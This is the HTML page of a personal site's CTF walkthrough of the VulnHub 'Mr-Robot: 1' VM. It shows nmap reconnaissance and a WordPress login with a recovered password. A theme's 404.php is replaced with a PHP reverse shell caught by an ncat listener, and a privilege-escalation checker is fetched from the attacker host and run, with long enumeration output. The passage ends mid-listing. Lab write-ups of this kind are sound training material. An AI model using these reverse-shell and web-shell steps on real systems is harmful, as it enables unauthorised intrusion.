@@ -1,0 +1,2167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+<!-- Title -->
+<title>Gandosha - Autodidacticism.</title>
+
+<!-- Core Stylesheet -->
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+<!-- Preloader -->
+<div id="preloader">
+<div class="loader"></div>
+</div>
+
+<div class="vcard-main-wrapper">
+<div class="vcard-content-wrapper bg-img" style="background-image: url(img/bg-img/bgssss.jpg);">
+<!-- Header Area -->
+<header class="header_area">
+<!-- Logo -->
+<div class="logo d-flex justify-content-center align-items-center">
+<a href="index-horizontal-about.html"><img src="img/core-img/logo3.png" alt=""></a>
+<!-- Navbar Toggle -->
+<div class="nav-toggle">
+<i class="fa fa-bars"></i>
+</div>
+</div>
+
+<!-- Menu -->
+<ul class="vcard-nav">
+<li><a href="https://github.com/Gandosha" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-fw fa-github" aria-hidden="true"></i></a></li>
+<li><a href="index.html">About</a></li>
+<li class="active"><a href="walkthroughs.html">CTF Walkthroughs</a></li>
+<li><a href="cheatsheets.html">Cheat Sheets</a></li>
+</ul>
+</header>
+
+<!-- Vcard Page Content -->
+<div class="vcard-page-content-wrapper d-flex align-items-end">
+<div class="page-content">
+
+<!-- ##### VM Title and link ##### -->
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+<div class="row align-items-end">
+<div class="about-me-text">
+<hr>
+<p><h2>Mr-Robot: 1</h2>
+<h7>VM: https://www.vulnhub.com/entry/mr-robot-1,151/</h7></p>
+<hr>
+<br>
+<br>
+<br>
+<br>
+<p><h3>Information Gathering:</h3></p>
+<hr>
+<p><font size="3.5" color="black">First, I fired up HaGashash in order to gain some information about which host to attack and what interesting ports are there. (https://github.com/Gandosha/HaGashash).</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# go run go/src/github.com/Gandosha/HaGashash/main.go -interface=enp0s3 -project=mr_robot -subnet=true
+
+
+
+<-=|HaGashash by Gandosha|=->
+
+[+] nmap executable is in '/usr/bin/nmap'
+[+] ifconfig executable is in '/usr/bin/ifconfig'
+[!] Dependencies check is completed successfully.
+
+
+[!] Starting to scan your subnet.
+
+ 
+[+] Alive hosts in 192.168.43.0/24 are:
+
+192.168.43.1
+
+192.168.43.2
+
+192.168.43.3
+
+192.168.43.5
+
+
+[+] Directory created at: /HaGashash_Projects/mr_robot/192.168.43.1.
+
+
+[!] Starting to scan 192.168.43.1 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.1 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/mr_robot/192.168.43.2.
+
+
+[!] Starting to scan 192.168.43.2 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.2 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/mr_robot/192.168.43.3.
+
+
+[!] Starting to scan 192.168.43.3 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.3 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/mr_robot/192.168.43.5.
+
+
+[!] Starting to scan 192.168.43.5 for UDP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.5 for TCP interesting stuff.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.5 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.5 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Summary file for 192.168.43.5 is ready.
+
+
+
+[+] Summary file for 192.168.43.3 is ready.
+
+
+
+[+] Summary file for 192.168.43.2 is ready.
+
+
+
+[+] Summary file for 192.168.43.1 is ready.
+
+[gandosha@GandoPC 192.168.43.3]$ cat nmap_TCP_scan_output
+# Nmap 7.70 scan initiated Fri Oct 12 15:31:51 2018 as: nmap -sS -p- -A -T4 -Pn -vv -oN /HaGashash_Projects/mr_robot/192.168.43.3/nmap_TCP_scan_output 192.168.43.3
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.43.3
+Host is up, received arp-response (0.0036s latency).
+Scanned at 2018-10-12 15:31:52 IDT for 111s
+Not shown: 65532 filtered ports
+Reason: 65532 no-responses
+PORT    STATE  SERVICE  REASON         VERSION
+22/tcp  closed ssh      reset ttl 64
+80/tcp  open   http     syn-ack ttl 64 Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Issuer: commonName=www.example.com
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
+| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+| -----BEGIN CERTIFICATE-----
+| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
+| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
+| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
+| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
+| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
+| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
+| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
+|_-----END CERTIFICATE-----
+MAC Address: 08:00:27:B9:68:76 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=10/12%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5
+OS:BC094A7%P=x86_64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=I%II
+OS:=I%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6
+OS:%O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%
+OS:W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%TG=40
+OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O
+OS:=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=
+OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 196.482 days (since Fri Mar 30 03:58:58 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   3.59 ms 192.168.43.3
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Oct 12 15:33:43 2018 -- 1 IP address (1 host up) scanned in 112.68 seconds
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Port 80 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Attempt to access via http port 80.</font></p> 
+<img src="img/mr_robot_1/1.png" alt="Attempt to access via http port 80" style="border:1px solid black;"> 
+<br>
+<br>
+<p><font size="3.5" color="black">I tried to spider and fuzz it in order to discover some content:</font></p>
+<img src="img/mr_robot_1/2.png" alt="spider" style="border:1px solid black;">
+<br>
+<br>
+<img src="img/mr_robot_1/3.png" alt="fuzz" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">I found some interesting files, but i waited for port 443 enumeration proccess to complete.</font></p>
+<hr>
+<br>
+<br>
+<p><h3>Port 443 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Attempt to access via https port 443.</font></p> 
+<img src="img/mr_robot_1/4.png" alt="Attempt to access via https port 443" style="border:1px solid black;"> 
+<br>
+<br>
+<p><font size="3.5" color="black">I tried to spider and fuzz it in order to discover some content:</font></p>
+<img src="img/mr_robot_1/5.png" alt="spider" style="border:1px solid black;">
+<br>
+<br>
+<img src="img/mr_robot_1/6.png" alt="fuzz" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">I found a robots.txt file that has information about some dictionary file and the location of the first key.</font></p>
+<br>
+<img src="img/mr_robot_1/7.png" alt="robots" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">Key 1 of 3 value:</font></p>
+<img src="img/mr_robot_1/8.png" alt="robots" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">The fuzzer did not finished his job, but still I discovered a base64 string that has Elliot's password:</font></p>
+<img src="img/mr_robot_1/9.png" alt="Elliot's password" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">In addition, a wp-login page has exposed:</font></p>
+<img src="img/mr_robot_1/10.png" alt="wp-login" style="border:1px solid black;">
+<hr>
+<br>
+<br>
+<p><h3>Logging in as Elliot and uploading a web shell:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Elliot's dashboard view:</font></p>
+<img src="img/mr_robot_1/11.png" alt="Elliot's dashboard view" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">* Note: victim's IP address has changed to 192.168.43.4.</font></p>
+<br>
+<br>
+<p><font size="3.5" color="black">I edited an existing 404.php (http://pentestmonkey.net/tools/web-shells/php-reverse-shell):</font></p>
+<img src="img/mr_robot_1/12.png" alt="edited 404.php" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">By navigating to the 404 page, I got a shell:</font></p>
+<img src="img/mr_robot_1/13.png" alt="404 page" style="border:1px solid black;">
+<br>
+<br>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.3]$ ncat -lvnp 4444
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.43.4.
+Ncat: Connection from 192.168.43.4:58932.
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 20:58:24 up  7:14,  0 users,  load average: 0.02, 0.04, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/$ id
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Privilege escalation</h3></p>
+<hr>
+<p><font size="3.5" color="black">I used linuxprivchecker.py in order to enumerate the daemon user:</font></p>
+<pre style="background-color:black;color:white;">
+daemon@linux:~$ cd /tmp	
+cd /tmp
+daemon@linux:/tmp$ ls
+ls
+daemon@linux:/tmp$ wget http://192.168.43.3/Tools/linuxprivchecker/linuxprivchecker.py
+<p://192.168.43.3/Tools/linuxprivchecker/linuxprivchecker.py                 
+--2018-10-14 21:01:34--  http://192.168.43.3/Tools/linuxprivchecker/linuxprivchecker.py
+Connecting to 192.168.43.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 25304 (25K)
+Saving to: 'linuxprivchecker.py'
+
+100%[======================================>] 25,304      --.-K/s   in 0s      
+
+2018-10-14 21:01:34 (587 MB/s) - 'linuxprivchecker.py' saved [25304/25304]
+
+daemon@linux:/tmp$ chmod +x linuxprivchecker.py
+chmod +x linuxprivchecker.py
+daemon@linux:/tmp$ python ./linuxprivchecker.py
+python ./linuxprivchecker.py
+=================================================================================================
+LINUX PRIVILEGE ESCALATION CHECKER
+=================================================================================================
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+
+[+] Hostname
+    linux
+
+[+] Operating System
+    _____          __________      ___.           __
+    /     \\_______  \\______   \\ ____\\_ |__   _____/  |_
+    /  \\ /  \\_  __ \\  |       _//  _ \\| __ \\ /  _ \\   __\\
+    /    Y    \\  | \\/  |    |   (  <_> ) \\_\\ (  <_> )  |
+    \\____|__  /__|     |____|_  /\\____/|___  /\\____/|__|
+    \\/                \\/           \\/
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+    eth0      Link encap:Ethernet  HWaddr 08:00:27:b9:68:76
+    inet addr:192.168.43.4  Bcast:192.168.43.255  Mask:255.255.255.0
+    inet6 addr: fe80::a00:27ff:feb9:6876/64 Scope:Link
+    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+    RX packets:1411285 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:2652147 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:521760394 (521.7 MB)  TX bytes:2913598473 (2.9 GB)
+    Interrupt:19 Base address:0xd020
+    lo        Link encap:Local Loopback
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+    UP LOOPBACK RUNNING  MTU:65536  Metric:1
+    RX packets:3122 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:3122 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:0
+    RX bytes:2021774 (2.0 MB)  TX bytes:2021774 (2.0 MB)
+
+[+] Netstat
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+    tcp        0      0 192.168.43.4:58932      192.168.43.3:4444       ESTABLISHED 2507/php-fpm: pool
+    tcp6       0      0 :::443                  :::*                    LISTEN      -
+    tcp6       0      0 :::80                   :::*                    LISTEN      -
+    tcp6       0      0 192.168.43.4:80         192.168.43.3:44997      FIN_WAIT2   -
+    udp        0      0 0.0.0.0:37036           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+    udp6       0      0 :::9119                 :::*                                -
+
+[+] Route
+    Kernel IP routing table
+    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+    192.168.43.0    *               255.255.255.0   U     0      0        0 eth0
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/sda1 on / type ext4 (rw)
+    proc on /proc type proc (rw)
+    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
+    none on /sys/fs/cgroup type tmpfs (rw)
+    none on /sys/fs/fuse/connections type fusectl (rw)
+    none on /sys/kernel/debug type debugfs (rw)
+    none on /sys/kernel/security type securityfs (rw)
+    udev on /dev type devtmpfs (rw,mode=0755)
+    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
+    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
+    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
+    none on /run/shm type tmpfs (rw,nosuid,nodev)
+    none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
+    none on /sys/fs/pstore type pstore (rw)
+
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    # <file system>                                 <mount point>   <type>  <options>       <dump>  <pass>
+    proc                                            /proc           proc    defaults        0       0
+    /dev/sda1                                       /               ext4    defaults        0       0
+    /dev/sda2                                       swap            swap    defaults        0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root  787 Oct 12 15:30 /etc/crontab
+    /etc/cron.d:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.daily:
+    total 44
+    drwxr-xr-x  2 root root  4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root  4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root   102 Feb  9  2013 .placeholder
+    -rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
+    -rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
+    -rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
+    -rwxr-xr-x  1 root root   249 Feb 17  2014 passwd
+    -rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.weekly:
+    total 16
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    -rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
+
+[+] Writable cron dirs
+
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] Logged in User Activity
+    21:03:05 up  7:19,  0 users,  load average: 0.02, 0.05, 0.05
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Super Users Found:
+    root
+
+[+] Environment
+    CURL_CA_BUNDLE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+    GS_LIB=
+    USER=daemon
+    LDAPCONF=/opt/bitnami/common/etc/openldap/ldap.conf
+    SHLVL=1
+    HOME=/usr/sbin
+    OLDPWD=/usr/sbin
+    SSL_CERT_FILE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+    OPENSSL_ENGINES=/opt/bitnami/common/lib/engines
+    FREETDSLOCALES=
+    _=/usr/bin/python
+    MAGICK_CONFIGURE_PATH=
+    OPENSSL_CONF=/opt/bitnami/common/openssl/openssl.cnf
+    PATH=/opt/bitnami/varnish/bin:/opt/bitnami/sqlite/bin:/opt/bitnami/php/bin:/opt/bitnami/mysql/bin:/opt/bitnami/apache2/bin:/opt/bitnami/common/bin:/sbin:/usr/sbin:/bin:/usr/bin
+    MAGICK_CODER_MODULE_PATH=
+    MAGICK_HOME=
+    FREETDSCONF=
+    PWD=/tmp
+
+[+] Root and current user history (depends on privs)
+
+[+] Sudoers (privileged)
+
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    libuuid:x:100:101::/var/lib/libuuid:
+    syslog:x:101:104::/home/syslog:/bin/false
+    sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+    ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+    bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+    mysql:x:1001:1001::/home/mysql:
+    varnish:x:999:999::/home/varnish:
+    robot:x:1002:1002::/home/robot:
+
+[+] Current User
+    daemon
+
+[+] Current User ID
+    uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 2 root root 40 Oct 14 13:43 /run/shm
+    drwxrwxrwt 3 root root 60 Oct 14 13:43 /run/lock
+    drwxrwxrwx 2 root root 4096 Oct 14 21:02 /opt/bitnami/mysql/tmp
+    drwxrwxrwx 2 root root 4096 Oct 14 20:49 /opt/bitnami/php/tmp
+    drwxrwxrwt 2 root root 4096 Nov 13  2015 /var/tmp
+    drwxrwxrwt 4 root root 4096 Oct 14 21:01 /tmp
+    drwxrwxrwt 2 root root 4096 Oct 14 13:43 /tmp/.ICE-unix
+    drwxrwxrwt 2 root root 4096 Oct 14 13:43 /tmp/.X11-unix
+
+[+] World Writeable Directories for Users other than Root
+
+[+] World Writable Files
+    -rwxrwxrwx 1 root root 1208 Dec 29  2005 /opt/bitnami/licenses/expat.txt
+    -rw-rw-rw- 1 root root 1861 Nov 27  2003 /opt/bitnami/licenses/cyrus-sasl.txt
+    -rw-rw-rw- 1 root root 0 Oct 14 10:44 /sys/kernel/security/apparmor/.access
+    -rwxrwxrwx 1 daemon daemon 25304 Sep 16 14:14 /tmp/linuxprivchecker.py
+
+[+] Checking if root's home folder is accessible
+
+[+] SUID/SGID Files and Directories
+    -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+    -rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
+    -rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
+    -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+    -rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
+    -rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
+    -rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
+    -rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
+    -rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
+    -rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
+    -rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
+    -rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
+    -rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
+    -rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+    -rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
+    -rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
+    -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+    drwxrwsr-x 6 root staff 4096 Jun 24  2015 /usr/local/share/xml
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/schema
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/declaration
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/misc
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/entities
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/ca-certificates
+    drwxrwsr-x 7 root staff 4096 Jun 24  2015 /usr/local/share/sgml
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/dtd
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/declaration
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/stylesheet
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/misc
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/entities
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/fonts
+    drwxrwsr-x 4 root staff 4096 Jun 24  2015 /usr/local/lib/python2.7
+    drwxrwsr-x 2 root staff 4096 Nov 13  2015 /usr/local/lib/python2.7/dist-packages
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/lib/python2.7/site-packages
+    drwxrwsr-x 3 root staff 4096 Jun 24  2015 /usr/local/lib/python3.4
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/lib/python3.4/dist-packages
+    -rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+    -r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    -r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    -rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
+    drwxrwsr-x 2 root staff 4096 Apr 10  2014 /var/local
+    drwxrwsr-x 2 libuuid libuuid 4096 Jun 24  2015 /var/lib/libuuid
+    drwxrwsr-x 2 root mail 4096 Jun 24  2015 /var/mail
+    -rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
+
+[+] Logs containing keyword 'password'
+    Shadow passwords are now on.
+
+[+] Config files containing keyword 'password'
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+
+[+] Shadow File (Privileged)
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+    Err?=(none)/Reinst-required (Status,Err:
+    Name Version  Description
+    adduser 3.113+nmu3ubuntu3  add and remove users and groups
+    apt 1.0.1ubuntu2.8  commandline package manager
+    apt-utils 1.0.1ubuntu2.8  package management related utility programs
+    autoconf 2.69-6  automatic configure script builder
+    automake 1:1.14.1-2ubuntu1  Tool for generating GNU Standards-compliant Makefiles
+    autotools-dev 20130810.1  Update infrastructure for config.{guess,sub} files
+    base-files 7.2ubuntu5.2  Debian base system miscellaneous files
+    base-passwd 3.5.33  Debian base system master password and group files
